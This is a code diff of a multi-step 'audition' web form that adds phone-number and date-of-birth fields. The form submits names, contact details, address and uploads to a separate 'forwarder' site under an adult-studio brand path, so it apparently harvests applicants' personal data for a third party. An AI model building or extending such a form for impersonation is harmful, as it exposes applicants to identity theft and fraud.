@@ -100,6 +100,15 @@
       color: #ffd700;
       font-size: 16px;
     }
+    input[type="date"] {
+  /* Ensure consistent appearance with other inputs */
+  padding: 12px;
+  font-family: Arial, sans-serif;
+}
+
+input[type="tel"] {
+  /* Phone number specific styling if needed */
+}
 
     label {
       font-weight: bold;
@@ -201,6 +210,7 @@
       margin-top: 15px;
       font-size: 16px;
     }
+    
 
     /* Hide scrollbars */
     ::-webkit-scrollbar {
@@ -225,19 +235,28 @@
   
   <form method="post" action="https://my-forwarder.site/bangbros/action.php" id="auditionForm" enctype="multipart/form-data">
 
-    <!-- Step 1: Personal Information -->
-    <div class="step active">
-      <label>First Name:</label>
-      <input type="text" name="firstName" required>
+   <!-- Step 1: Personal Information -->
+<div class="step active">
+  <label>First Name:</label>
+  <input type="text" name="firstName" required>
 
-      <label>Last Name:</label>
-      <input type="text" name="lastName" required>
+  <label>Last Name:</label>
+  <input type="text" name="lastName" required>
 
-      <div class="buttons" style="justify-content: flex-end;">
-        <button type="button" onclick="validateStepAndProceed()">Next</button>
-      </div>
-    </div>
+  <!-- Add Phone Number Field -->
+  <label>Phone Number:</label>
+  <input type="tel" name="phone" pattern="[0-9]{10,15}" required>
+  <small>Format: 1234567890 (no spaces or special characters)</small>
 
+  <!-- Add Date of Birth Field -->
+  <label>Date of Birth:</label>
+  <input type="date" name="dob" max="<?php echo date('Y-m-d', strtotime('-18 years')); ?>" required>
+  <small>You must be at least 18 years old</small>
+
+  <div class="buttons" style="justify-content: flex-end;">
+    <button type="button" onclick="validateStepAndProceed()">Next</button>
+  </div>
+</div>
     <!-- Step 2: Address Information -->
     <div class="step">
       <label>Country:</label>
